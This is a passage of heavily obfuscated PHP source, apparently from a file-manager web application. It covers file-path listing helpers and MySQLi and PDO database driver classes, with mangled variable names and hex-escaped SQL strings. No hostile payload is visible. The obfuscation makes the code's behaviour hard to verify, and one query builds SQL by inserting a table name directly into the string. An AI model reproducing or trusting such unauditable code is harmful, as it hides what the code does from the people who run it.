(isset($®—×‰˜ò[$¬ØÚğ›¯])) { $Ç€œ™‰á .= $®—×‰˜ò[$¬ØÚğ›¯] . $´°¨ôÇ[8]; } } $Š•Ÿ­Ó£[$¥×âƒù] = $Ç€œ™‰á; } $Ç€œ™‰á .= $ºêƒ¿ñ[$´°¨ôÇ[42]]; if ($ºêƒ¿ñ[$´°¨ôÇ[419]] == $´°¨ôÇ[99]) { $Ç€œ™‰á .= $´°¨ôÇ[8]; } $ºêƒ¿ñ[$´°¨ôÇ[518]] = str_replace($´°¨ôÇ[528], $´°¨ôÇ[8], $Ç€œ™‰á); if ($ºêƒ¿ñ[$´°¨ôÇ[441]] == $´°¨ôÇ[209]) { $ºêƒ¿ñ[$´°¨ôÇ[42]] = trim($®—×‰˜ò[$ºêƒ¿ñ[$´°¨ôÇ[411]]], $´°¨ôÇ[8]); $ºêƒ¿ñ[$´°¨ôÇ[518]] = $ºêƒ¿ñ[$´°¨ôÇ[42]] . $´°¨ôÇ[8]; } if (intval($ºêƒ¿ñ[$´°¨ôÇ[420]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ºêƒ¿ñ, $è¿üÔÉ•, $ö£æ¸¡š); } } unset($ºêƒ¿ñ); return $÷­¢Ã; } private function _listAppendPathRecycle(&$ğÔ©äÕÌ, $§ˆÕşÚ, $¶ÉôØõñ) { $®ó–ê˜Õ =& $_SERVER[Å¶¨Şêº]; if (!in_array($¶ÉôØõñ, $§ˆÕşÚ) && $ğÔ©äÕÌ[$®ó–ê˜Õ[411]] != $¶ÉôØõñ) { return; } $Æî‘’  = explode($®ó–ê˜Õ[8], trim($ğÔ©äÕÌ[$®ó–ê˜Õ[518]], $®ó–ê˜Õ[8])); $¸ù”‘š¦ = implode($®ó–ê˜Õ[8], array_slice($Æî‘’ , 2)); $ğÔ©äÕÌ[$®ó–ê˜Õ[518]] = $®ó–ê˜Õ[8] . LNG($®ó–ê˜Õ[529]) . $®ó–ê˜Õ[8] . ltrim($¸ù”‘š¦, $®ó–ê˜Õ[8]); $ğÔ©äÕÌ[$®ó–ê˜Õ[520]] = $®ó–ê˜Õ[530] . implode($®ó–ê˜Õ[60], array_slice($§ˆÕşÚ, 1)) . $®ó–ê˜Õ[60]; if ($ğÔ©äÕÌ[$®ó–ê˜Õ[411]] == $¶ÉôØõñ) { $ğÔ©äÕÌ[$®ó–ê˜Õ[520]] = $®ó–ê˜Õ[530]; $ğÔ©äÕÌ[$®ó–ê˜Õ[441]] = $®ó–ê˜Õ[209]; $ğÔ©äÕÌ[$®ó–ê˜Õ[42]] = LNG($®ó–ê˜Õ[529]); } $ğÔ©äÕÌ[$®ó–ê˜Õ[531]] = $®ó–ê˜Õ[532]; } protected function _listAppendPathRoot(&$¾µ‹¯–, $§¡ş»±) { $Óó¥†¥Ñ =& $_SERVER[Å¶¨Şêº]; static $¯À˜ì™Ó = false; $§”ÚÏ§ğ = $Óó¥†¥Ñ[12]; if ($¾µ‹¯–[$Óó¥†¥Ñ[420]] == self::TYPE_USER) { if ($¾µ‹¯–[$Óó¥†¥Ñ[505]] == USER_ID) { $§”ÚÏ§ğ = LNG($Óó¥†¥Ñ[533]); if ($¯À˜ì™Ó === !1) { $Ş‰‚âƒØ = Model($Óó¥†¥Ñ[534])->getInfoFull(USER_ID); $¯À˜ì™Ó = _get($Ş‰‚âƒØ, $Óó¥†¥Ñ[535], $Óó¥†¥Ñ[12]); } if ($§¡ş»± && $§¡ş»±[0] == $¯À˜ì™Ó || !$§¡ş»± && $¾µ‹¯–[$Óó¥†¥Ñ[411]] == $¯À˜ì™Ó) { $§”ÚÏ§ğ = LNG($Óó¥†¥Ñ[536]); $¾µ‹¯–[$Óó¥†¥Ñ[537]] = $Óó¥†¥Ñ[538]; } if (!$§¡ş»±) { $¾µ‹¯–[$Óó¥†¥Ñ[42]] = $§”ÚÏ§ğ; } } else { $Óçï¹„ = Model($Óó¥†¥Ñ[513])->getInfoSimple($¾µ‹¯–[$Óó¥†¥Ñ[505]]); $§”ÚÏ§ğ = LNG($Óó¥†¥Ñ[539]) . $Óó¥†¥Ñ[173] . $Óçï¹„[$Óó¥†¥Ñ[42]] . $Óó¥†¥Ñ[175]; $¾µ‹¯–[$Óó¥†¥Ñ[540]] = array($Óó¥†¥Ñ[42] => $Óçï¹„[$Óó¥†¥Ñ[42]], $Óó¥†¥Ñ[541] => $Óçï¹„[$Óó¥†¥Ñ[541]], $Óó¥†¥Ñ[542] => $Óçï¹„[$Óó¥†¥Ñ[542]]); } } else { if ($¾µ‹¯–[$Óó¥†¥Ñ[420]] == self::TYPE_GROUP) { $Óçï¹„ = Model($Óó¥†¥Ñ[521])->getInfoSimple($¾µ‹¯–[$Óó¥†¥Ñ[505]]); $§”ÚÏ§ğ = $Óçï¹„[$Óó¥†¥Ñ[42]]; } else { if ($¾µ‹¯–[$Óó¥†¥Ñ[420]] == self::TYPE_SYSTEM) { $§”ÚÏ§ğ = $Óó¥†¥Ñ[543]; } } } $§”ÚÏ§ğ = $§”ÚÏ§ğ ? $Óó¥†¥Ñ[8] . $§”ÚÏ§ğ . $Óó¥†¥Ñ[8] : $Óó¥†¥Ñ[8]; return $§”ÚÏ§ğ; } protected function _listAppendUser(&$Ğ€µ„‘Í) { $ã™Ù¦½Ÿ =& $_SERVER[Å¶¨Şêº]; $Âç«ıã” = array_to_keyvalue($Ğ€µ„‘Í, $ã™Ù¦½Ÿ[12], $ã™Ù¦½Ÿ[463]); $¡º½­ÚÂ = array_to_keyvalue($Ğ€µ„‘Í, $ã™Ù¦½Ÿ[12], $ã™Ù¦½Ÿ[465]); $Å†°©ù = array_merge($Âç«ıã”, $¡º½­ÚÂ); $ò›ö«±¹ = Model($ã™Ù¦½Ÿ[534])->userListInfo($Å†°©ù); foreach ($Ğ€µ„‘Í as &$åªáª­”) { $÷öÄİš¼ = $åªáª­”[$ã™Ù¦½Ÿ[463]]; $åªáª­”[$ã™Ù¦½Ÿ[463]] = $ò›ö«±¹[$÷öÄİš¼] ? $ò›ö«±¹[$÷öÄİš¼] : !1; $÷öÄİš¼ = $åªáª­”[$ã™Ù¦½Ÿ[465]]; $åªáª­”[$ã™Ù¦½Ÿ[465]] = $ò›ö«±¹[$÷öÄİš¼] ? $ò›ö«±¹[$÷öÄİš¼] : !1; if (isset($åªáª­”[$ã™Ù¦½Ÿ[475]]) && $åªáª­”[$ã™Ù¦½Ÿ[475]][$ã™Ù¦½Ÿ[544]]) { $Ì «şŸË = $GLOBALS[$ã™Ù¦½Ÿ[6]][$ã™Ù¦½Ÿ[100]][$ã™Ù¦½Ÿ[545]]; if ($åªáª­”[$ã™Ù¦½Ÿ[475]][$ã™Ù¦½Ÿ[546]] <= time() - $Ì «şŸË) { $this->metaSet($åªáª­”[$ã™Ù¦½Ÿ[411]], $ã™Ù¦½Ÿ[544], null); $this->metaSet($åªáª­”[$ã™Ù¦½Ÿ[411]], $ã™Ù¦½Ÿ[546], null); unset($åªáª­”[$ã™Ù¦½Ÿ[475]][$ã™Ù¦½Ÿ[544]]); continue; } $—õæù°Ó = $åªáª­”[$ã™Ù¦½Ÿ[475]][$ã™Ù¦½Ÿ[544]]; $åªáª­”[$ã™Ù¦½Ÿ[475]][$ã™Ù¦½Ÿ[547]] = Model($ã™Ù¦½Ÿ[534])->getInfoSimpleOuter($—õæù°Ó); } } unset($åªáª­”); } public function parentLevelArray($İæ´Ÿ÷) { $Ç­–¹×Û =& $_SERVER[Å¶¨Şêº]; $İæ´Ÿ÷ = explode($Ç­–¹×Û[60], trim($İæ´Ÿ÷, $Ç­–¹×Û[60])); return array_remove_value($İæ´Ÿ÷, $Ç­–¹×Û[209]); } public function listAll($Ñ ƒ÷Ğá) { $¿ì²õâ˜ =& $_SERVER[Å¶¨Şêº]; $“«­»Êà = $this->sourceInfo($Ñ ƒ÷Ğá); $–şØûˆ¨ = array($¿ì²õâ˜[548] => array($¿ì²õâ˜[549], $“«­»Êà[$¿ì²õâ˜[520]] . $Ñ ƒ÷Ğá . $¿ì²õâ˜[550]), $¿ì²õâ˜[551] => 0); $Ïî¬ü›£ = $¿ì²õâ˜[552]; $Ä›Çü® = "\114\105\106\x54\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\157\137\x66\151\154\145\40\146\151\x6c\145\x20\x6f\156\x20\163\157\165\x72\143\145\x2e\146\x69\154\145\x49\x44\x20\x3d\x20\x66\151\154\145\56\x66\151\x6c\x65\x49\104"; $Ô¾¿¹Ò = $this->alias($¿ì²õâ˜[455])->field($Ïî¬ü›£)->where($–şØûˆ¨)->join($Ä›Çü®)->select(); $this->_listAppendAuth($Ô¾¿¹Ò); $this->_listAppendUser($Ô¾¿¹Ò); $this->_listAppendPath($Ô¾¿¹Ò); $Ô¾¿¹Ò = array_to_keyvalue($Ô¾¿¹Ò, $¿ì²õâ˜[411]); $«©šß£ = "\57{$“«­»Êà[$¿ì²õâ˜[42]]}\x2f"; $«©šß£ = $«©šß£ == $¿ì²õâ˜[528] ? $¿ì²õâ˜[8] : $«©šß£; $å¤ı·ê  = array(); foreach ($Ô¾¿¹Ò as $ı…Í“ßÛ => $Ø¡Á§ı”) { $ß¸€¦  = $this->parentLevelArray($Ø¡Á§ı”[$¿ì²õâ˜[520]]); array_shift($ß¸€¦ ); $™à¢ùé­ = $«©šß£; for ($åğ¹»·æ = 0; $åğ¹»·æ < count($ß¸€¦ ); $åğ¹»·æ++) { $™à¢ùé­ .= $Ô¾¿¹Ò[$ß¸€¦ [$åğ¹»·æ]][$¿ì²õâ˜[42]] . $¿ì²õâ˜[8]; } $™à¢ùé­ .= $Ø¡Á§ı”[$¿ì²õâ˜[42]]; if ($Ø¡Á§ı”[$¿ì²õâ˜[419]]) { $™à¢ùé­ .= $¿ì²õâ˜[8]; } $Ùññ·¹† = array($¿ì²õâ˜[430] => str_replace($¿ì²õâ˜[528], $¿ì²õâ˜[8], str_replace($¿ì²õâ˜[528], $¿ì²õâ˜[8], str_replace($¿ì²õâ˜[528], $¿ì²õâ˜[8], $™à¢ùé­))), $¿ì²õâ˜[553] => intval($Ø¡Á§ı”[$¿ì²õâ˜[419]]), $¿ì²õâ˜[554] => intval($Ø¡Á§ı”[$¿ì²õâ˜[87]]), $¿ì²õâ˜[96] => intval($Ø¡Á§ı”[$¿ì²õâ˜[96]]), $¿ì²õâ˜[98] => $this->pathInfoFilter($Ø¡Á§ı”)); if (!$Ùññ·¹†[$¿ì²õâ˜[419]]) { $Ùññ·¹†[$¿ì²õâ˜[477]] = $Ø¡Á§ı”[$¿ì²õâ˜[477]]; } $å¤ı·ê [] = $Ùññ·¹†; } $å¤ı·ê  = array_sort_by($å¤ı·ê , $¿ì²õâ˜[95]); return $å¤ı·ê ; } } goto eè¢¼®Ÿ…; C«¬ô¸¾Í¢: class DbMysqli extends Db { public function __construct($–‰’ï¯¬ = '') { $³ğš…éİ =& $_SERVER[Å¶¨Şêº]; if (!extension_loaded($³ğš…éİ[909])) { think_exception(think_lang($³ğš…éİ[24]) . $³ğš…éİ[910]); } if (!empty($–‰’ï¯¬)) { $this->config = $–‰’ï¯¬; if (empty($this->config[$³ğš…éİ[27]])) { $this->config[$³ğš…éİ[27]] = $³ğš…éİ[12]; } } } public function connect($î·âÇÑ» = '', $Úİë²Ÿè = 0) { $Ù¹£ğüû =& $_SERVER[Å¶¨Şêº]; if (!isset($this->linkID[$Úİë²Ÿè])) { if (empty($î·âÇÑ»)) { $î·âÇÑ» = $this->config; } $this->linkID[$Úİë²Ÿè] = new mysqli($î·âÇÑ»[$Ù¹£ğüû[883]], $î·âÇÑ»[$Ù¹£ğüû[885]], $î·âÇÑ»[$Ù¹£ğüû[886]], $î·âÇÑ»[$Ù¹£ğüû[31]], $î·âÇÑ»[$Ù¹£ğüû[884]] ? intval($î·âÇÑ»[$Ù¹£ğüû[884]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÔÙÍ’ô = $this->linkID[$Úİë²Ÿè]->server_version; $this->linkID[$Úİë²Ÿè]->query($Ù¹£ğüû[887] . think_config($Ù¹£ğüû[888]) . $Ù¹£ğüû[68]); if ($ÔÙÍ’ô > $Ù¹£ğüû[889]) { $this->linkID[$Úİë²Ÿè]->query($Ù¹£ğüû[890]); } $this->connected = !0; if (1 != think_config($Ù¹£ğüû[32])) { unset($this->config); } } return $this->linkID[$Úİë²Ÿè]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($‰¤üä©Š) { $Íñ†ìÒ‡ =& $_SERVER[Å¶¨Şêº]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‰¤üä©Š; if ($this->queryID) { $this->free(); } think_action_status($Íñ†ìÒ‡[33], 1); think_status($Íñ†ìÒ‡[34]); $this->queryID = $this->_linkID->query($‰¤üä©Š); if ($this->_linkID->more_results()) { while (($Æğ¦Ğç¯ = $this->_linkID->next_result()) != NULL) { $Æğ¦Ğç¯->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($û¹·½İ®) { $Ï›¦ÈØ =& $_SERVER[Å¶¨Şêº]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $û¹·½İ®; if ($this->queryID) { $this->free(); } think_action_status($Ï›¦ÈØ[35], 1); think_status($Ï›¦ÈØ[34]); $­Ï÷ë Œ = $this->_linkID->query($û¹·½İ®); $this->debug(); if (!1 === $­Ï÷ë Œ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $†Ù¤«É = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$†Ù¤«É) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $£ÔÓïïá = $this->_linkID->rollback(); $this->transTimes = 0; if (!$£ÔÓïïá) { $this->error(); return !1; } } return !0; } private function getAll() { $ÒºÓ²¬ = array(); if ($this->numRows > 0) { for ($’£Û¾·‚ = 0; $’£Û¾·‚ < $this->numRows; $’£Û¾·‚++) { $ÒºÓ²¬[$’£Û¾·‚] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ÒºÓ²¬; } public function getFields($÷Œ¨ıÌ) { $¼‡ûŸö© =& $_SERVER[Å¶¨Şêº]; $¶™€âşİ = $this->query($¼‡ûŸö©[894] . $this->parseKey($÷Œ¨ıÌ)); $Ö£¬€í² = array(); if ($¶™€âşİ) { foreach ($¶™€âşİ as $·æ–ÎÍ½ => $š ğÎå) { $Ö£¬€í²[$š ğÎå[$¼‡ûŸö©[41]]] = array($¼‡ûŸö©[42] => $š ğÎå[$¼‡ûŸö©[41]], $¼‡ûŸö©[43] => $š ğÎå[$¼‡ûŸö©[44]], $¼‡ûŸö©[45] => (bool) ($š ğÎå[$¼‡ûŸö©[46]] === $¼‡ûŸö©[12]), $¼‡ûŸö©[47] => $š ğÎå[$¼‡ûŸö©[48]], $¼‡ûŸö©[49] => strtolower($š ğÎå[$¼‡ûŸö©[50]]) == $¼‡ûŸö©[51], $¼‡ûŸö©[52] => strtolower($š ğÎå[$¼‡ûŸö©[53]]) == $¼‡ûŸö©[54]); } } return $Ö£¬€í²; } public function getTables($ş¶úÁø¼ = '') { $›¹ñŸ® =& $_SERVER[Å¶¨Şêº]; $ÌÕÇÈ¸ = !empty($ş¶úÁø¼) ? $›¹ñŸ®[896] . $ş¶úÁø¼ . $›¹ñŸ®[897] : $›¹ñŸ®[898]; $È§›† = $this->query($ÌÕÇÈ¸); $Î¢®²ĞÖ = array(); if ($È§›†) { foreach ($È§›† as $–¶´Ò˜‰ => $»ÇÕ„—ê) { $Î¢®²ĞÖ[$–¶´Ò˜‰] = current($»ÇÕ„—ê); } } return $Î¢®²ĞÖ; } public function replace($¨”ÕÃ¾ù, $Â¾î šÆ = array()) { $òÄŞœµë =& $_SERVER[Å¶¨Şêº]; foreach ($¨”ÕÃ¾ù as $ï¦•ÂâÍ => $Óğ‰å’) { $»Ôéµª‚ = $this->parseValue($Óğ‰å’); if (is_scalar($»Ôéµª‚)) { $úåÜ–Ÿ¿[] = $»Ôéµª‚; $ÂšÜ¶è«[] = $this->parseKey($ï¦•ÂâÍ); } } $©ÛŒÄ·ñ = $òÄŞœµë[899] . $this->parseTable($Â¾î šÆ[$òÄŞœµë[289]]) . $òÄŞœµë[900] . implode($òÄŞœµë[60], $ÂšÜ¶è«) . $òÄŞœµë[901] . implode($òÄŞœµë[60], $úåÜ–Ÿ¿) . $òÄŞœµë[902]; return $this->execute($©ÛŒÄ·ñ); } public function insertAll($²íÅ»Ÿ§, $ıã«­Š = array(), $å´àßÇÉ = false) { $™¶—Ù¡Ú =& $_SERVER[Å¶¨Şêº]; if (!is_array($²íÅ»Ÿ§[0])) { return !1; } $®ıÒÒ ‹ = array_keys($²íÅ»Ÿ§[0]); $”¸¼Ã¼» = array(); foreach ($²íÅ»Ÿ§ as $æè×ü ) { $ÅÂçß¿ = array(); foreach ($æè×ü  as $ê£¡’ => $±û¿ºÛ˜) { $±û¿ºÛ˜ = $this->parseValue($±û¿ºÛ˜); if (is_scalar($±û¿ºÛ˜)) { $ÅÂçß¿[] = $±û¿ºÛ˜; } } $”¸¼Ã¼»[] = $™¶—Ù¡Ú[270] . implode($™¶—Ù¡Ú[60], $ÅÂçß¿) . $™¶—Ù¡Ú[902]; } array_walk($®ıÒÒ ‹, array($this, $™¶—Ù¡Ú[903])); $°—‡Î¾µ = $å´àßÇÉ ? $™¶—Ù¡Ú[904] : $™¶—Ù¡Ú[905]; $ä§µº³ã = $°—‡Î¾µ . $™¶—Ù¡Ú[906] . $this->parseTable($ıã«­Š[$™¶—Ù¡Ú[289]]) . $™¶—Ù¡Ú[900] . implode($™¶—Ù¡Ú[60], $®ıÒÒ ‹) . $™¶—Ù¡Ú[907] . implode($™¶—Ù¡Ú[60], $”¸¼Ã¼»); return $this->execute($ä§µº³ã); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¼ù­€¿Á =& $_SERVER[Å¶¨Şêº]; $this->error = $this->_linkID->errno . $¼ù­€¿Á[4] . $this->_linkID->error; if ($¼ù­€¿Á[12] != $this->queryStr) { $this->error .= LNG($¼ù­€¿Á[58]) . $this->queryStr; } think_trace($this->error, $¼ù­€¿Á[12], $¼ù­€¿Á[59]); return $this->error; } public function escapeString($É¯¶¸œ») { if ($this->_linkID) { return $this->_linkID->real_escape_string($É¯¶¸œ»); } else { return addslashes($É¯¶¸œ»); } } public function parseKey(&$ò¸×Ü¾À, $›„¦ñ¤‚ = true) { $ØªÔ¯¾à =& $_SERVER[Å¶¨Şêº]; if ($›„¦ñ¤‚) { $ò¸×Ü¾À = $this->parseKeyCheck($ò¸×Ü¾À); } if ($ò¸×Ü¾À != $ØªÔ¯¾à[200] && !preg_match($ØªÔ¯¾à[908], $ò¸×Ü¾À)) { $ò¸×Ü¾À = $ØªÔ¯¾à[394] . trim($ò¸×Ü¾À, $ØªÔ¯¾à[394]) . $ØªÔ¯¾à[394]; } return $ò¸×Ü¾À; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ä¬°Ë©• = '') { $Í¨Ù³ü =& $_SERVER[Å¶¨Şêº]; if (!class_exists($Í¨Ù³ü[911])) { think_exception(think_lang($Í¨Ù³ü[24]) . $Í¨Ù³ü[912]); } if (!empty($ä¬°Ë©•)) { $this->config = $ä¬°Ë©•; if (empty($this->config[$Í¨Ù³ü[27]])) { $this->config[$Í¨Ù³ü[27]] = array(); } } } public function connect($Ëî¹ÓÂ¨ = '', $€Ÿ¨¦Ë = 0) { $¼Š²ï›Ô =& $_SERVER[Å¶¨Şêº]; if (!isset($this->linkID[$€Ÿ¨¦Ë])) { if (empty($Ëî¹ÓÂ¨)) { $Ëî¹ÓÂ¨ = $this->config; } $æÜşÚ© = !empty($Ëî¹ÓÂ¨[$¼Š²ï›Ô[27]][$¼Š²ï›Ô[28]]) ? $Ëî¹ÓÂ¨[$¼Š²ï›Ô[27]][$¼Š²ï›Ô[28]] : $this->pconnect; if ($æÜşÚ©) { $Ëî¹ÓÂ¨[$¼Š²ï›Ô[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$€Ÿ¨¦Ë] = new PDO($Ëî¹ÓÂ¨[$¼Š²ï›Ô[913]], $Ëî¹ÓÂ¨[$¼Š²ï›Ô[885]], $Ëî¹ÓÂ¨[$¼Š²ï›Ô[886]], $Ëî¹ÓÂ¨[$¼Š²ï›Ô[27]]); } catch (PDOException $ôÇ·şğ) { think_exception($ôÇ·şğ->getMessage()); } $this->dbType = $this->_getDsnType($Ëî¹ÓÂ¨[$¼Š²ï›Ô[913]]); if (in_array($this->dbType, array($¼Š²ï›Ô[914], $¼Š²ï›Ô[915], $¼Š²ï›Ô[916], $¼Š²ï›Ô[917]))) { think_exception($¼Š²ï›Ô[918] . $this->dbType . $¼Š²ï›Ô[919] . $this->dbType . $¼Š²ï›Ô[920]); } if (!$this->linkID[$€Ÿ¨¦Ë]) { think_exception($¼Š²ï›Ô[921]); } try { $this->linkID[$€Ÿ¨¦Ë]->exec($¼Š²ï›Ô[922] . think_config($¼Š²ï›Ô[888])); } catch (Exception $ôÇ·şğ) { } $this->connected = !0; if (1 != think_config($¼Š²ï›Ô[32])) { unset($this->config); } } return $this->linkID[$€Ÿ¨¦Ë]; } public function free() { $this->PDOStatement = null; } public function query($šöı”, $çĞÏÛ¦Û = array()) { $ªÂ»˜éŸ =& $_SERVER[Å¶¨Şêº]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $šöı”; if (!empty($çĞÏÛ¦Û)) { $this->queryStr .= $ªÂ»˜éŸ[923] . print_r($çĞÏÛ¦Û, !0) . $ªÂ»˜éŸ[924]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ªÂ»˜éŸ[33], 1); think_status($ªÂ»˜éŸ[34]); $this->PDOStatement = $this->_linkID->prepare($šöı”); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ªèá£ÜÜ = $this->PDOStatement->execute($çĞÏÛ¦Û); $this->debug(); if (!1 === $ªèá£ÜÜ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ÚØ‰ÁÌ®, $³Š£ÎÈ = array()) { $Ğ”‘ó¼ =& $_SERVER[Å¶¨Şêº]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÚØ‰ÁÌ®; if (!empty($³Š£ÎÈ)) { $this->queryStr .= $Ğ”‘ó¼[923] . print_r($³Š£ÎÈ, !0) . $Ğ”‘ó¼[924]; } $Ù‰Š™¸ = !1; if ($this->dbType == $Ğ”‘ó¼[917]) { if (preg_match($Ğ”‘ó¼[925], $this->queryStr, $’¡Ã¬–ù)) { $this->table = think_config($Ğ”‘ó¼[926]) . str_ireplace(think_config($Ğ”‘ó¼[927]), $Ğ”‘ó¼[70], $’¡Ã¬–ù[2]); $Ù‰Š™¸ = (bool) $this->query($Ğ”‘ó¼[928] . strtoupper($this->table) . $Ğ”‘ó¼[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ğ”‘ó¼[35], 1); think_status($Ğ”‘ó¼[34]); $this->PDOStatement = $this->_linkID->prepare($ÚØ‰ÁÌ®); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÊÔµ±¢‹ = $this->PDOStatement->execute($³Š£ÎÈ); $this->debug(); if (!1 === $ÊÔµ±¢‹) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Ù‰Š™¸ || preg_match($Ğ”‘ó¼[929], $ÚØ‰ÁÌ®)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $µæé‹´Î = $this->_linkID->commit(); $this->transTimes = 0; if (!$µæé‹´Î) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ûÊÛ·Ó‡ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ûÊÛ·Ó‡) { $this->error(); return !1; } } return !0; } private function getAll() { $¡ÌñÊ¤È = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¡ÌñÊ¤È); return $¡ÌñÊ¤È; } public function getFields($Ù„Ğ˜Á¯) { $µÂëÍÕÕ =& $_SERVER[Å¶¨Şêº]; $this->initConnect(!0); if (think_config($µÂëÍÕÕ[930])) { $ßó£ãàÄ = str_replace($µÂëÍÕÕ[931], $Ù„Ğ˜Á¯, think_config($µÂëÍÕÕ[930])); } else { switch ($this->dbType) { case $µÂëÍÕÕ[914]: case $µÂëÍÕÕ[932]: $ßó£ãàÄ = "\123\x45\114\105\103\124\x20\40\x20\143\x6f\154\165\155\156\x5f\x6e\x61\155\x65\x20\x61\x73\x20\x27\x4e\x61\x6d\145\47\x2c\40\x20\x20\x64\141\x74\x61\137\164\x79\160\x65\40\141\163\x20\47\x54\x79\160\x65\x27\54\x20\x20\x20\143\x6f\154\x75\x6d\156\x5f\x64\x65\x66\141\165\x6c\164\40\x61\163\40\x27\x44\x65\x66\141\165\x6c\164\x27\54\40\x20\40\x69\x73\137\156\165\x6c\x6c\x61\x62\x6c\x65\40\x61\x73\40\47\116\x75\154\x6c\47\xa\11\11\106\122\x4f\115\x9\151\x6e\146\x6f\x72\x6d\x61\x74\x69\157\x6e\137\163\143\x68\145\155\x61\x2e\164\x61\142\154\145\163\40\101\123\40\164\12\x9\x9\x4a\117\111\116\x9\x69\x6e\146\157\162\x6d\x61\x74\151\x6f\x6e\x5f\163\143\150\145\x6d\x61\x2e\143\x6f\154\165\x6d\156\163\x20\101\x53\40\143\12\x9\x9\x4f\x4e\x20\x20\x74\56\x74\x61\x62\154\x65\x5f\x63\141\x74\141\x6c\157\x67\40\75\x20\143\56\164\x61\x62\154\145\137\143\141\164\141\x6c\157\147\xa\11\x9\101\x4e\104\x20\164\56\164\141\x62\x6c\x65\137\x73\x63\150\145\x6d\x61\x20\x3d\40\x63\x2e\164\141\x62\x6c\x65\x5f\163\143\150\145\155\x61\xa\x9\11\101\116\104\40\164\56\164\141\x62\x6c\x65\137\x6e\x61\155\x65\x20\x3d\x20\143\56\x74\141\x62\x6c\145\137\x6e\x61\x6d\x65\12\x9\11\x57\110\x45\x52\x45\40\40\40\x74\x2e\x74\141\142\x6c\145\x5f\156\x61\155\x65\40\x3d\40\47{$Ù„Ğ˜Á¯}\x27"; break; case $µÂëÍÕÕ[933]: $ßó£ãàÄ = $µÂëÍÕÕ[934] . $Ù„Ğ˜Á¯ . $µÂëÍÕÕ[935]; break; case $µÂëÍÕÕ[915]: case $µÂëÍÕÕ[917]: $ßó£ãàÄ = $µÂëÍÕÕ[936] . $µÂëÍÕÕ[937] . $µÂëÍÕÕ[938] . strtoupper($Ù„Ğ˜Á¯) . $µÂëÍÕÕ[939] . strtoupper($Ù„Ğ˜Á¯) . $µÂëÍÕÕ[940]; break; case $µÂëÍÕÕ[941]: $ßó£ãàÄ = $µÂëÍÕÕ[942] . $Ù„Ğ˜Á¯ . $µÂëÍÕÕ[943]; break; case $µÂëÍÕÕ[916]: break; case $µÂëÍÕÕ[944]: default: $ßó£ãàÄ = $µÂëÍÕÕ[945] . ($this->dbType == $µÂëÍÕÕ[944] ? "\140{$Ù„Ğ˜Á¯}\x60" : $Ù„Ğ˜Á¯); } } $Ò¹‡ö = $this->query($ßó£ãàÄ); $ÀÃá›§ = array(); if ($Ò¹‡ö) { foreach ($Ò¹‡ö as $ø±çô¢î => $İƒ®´şğ) { $İƒ®´şğ = array_change_key_case($İƒ®´şğ); $İƒ®´şğ[$µÂëÍÕÕ[42]] = isset($İƒ®´şğ[$µÂëÍÕÕ[42]]) ? $İƒ®´şğ[$µÂëÍÕÕ[42]] : $µÂëÍÕÕ[70]; $İƒ®´şğ[$µÂëÍÕÕ[43]] = isset($İƒ®´şğ[$µÂëÍÕÕ[43]]) ? $İƒ®´şğ[$µÂëÍÕÕ[43]] : $µÂëÍÕÕ[70]; $ïîª‘î = isset($İƒ®´şğ[$µÂëÍÕÕ[283]]) ? $İƒ®´şğ[$µÂëÍÕÕ[283]] : $İƒ®´şğ[$µÂëÍÕÕ[42]]; $ÀÃá›§[$ïîª‘î] = array($µÂëÍÕÕ[42] => $ïîª‘î, $µÂëÍÕÕ[43] => $İƒ®´şğ[$µÂëÍÕÕ[43]], $µÂëÍÕÕ[45] => (bool) (isset($İƒ®´şğ[$µÂëÍÕÕ[114]]) && $İƒ®´şğ[$µÂëÍÕÕ[114]] === $µÂëÍÕÕ[12] || isset($İƒ®´şğ[$µÂëÍÕÕ[45]]) && $İƒ®´şğ[$µÂëÍÕÕ[45]] === $µÂëÍÕÕ[12]), $µÂëÍÕÕ[47] => isset($İƒ®´şğ[$µÂëÍÕÕ[47]]) ? $İƒ®´şğ[$µÂëÍÕÕ[47]] : (isset($İƒ®´şğ[$µÂëÍÕÕ[66]]) ? $İƒ®´şğ[$µÂëÍÕÕ[66]] : $µÂëÍÕÕ[70]), $µÂëÍÕÕ[49] => isset($İƒ®´şğ[$µÂëÍÕÕ[105]]) ? strtolower($İƒ®´şğ[$µÂëÍÕÕ[105]]) == $µÂëÍÕÕ[51] : 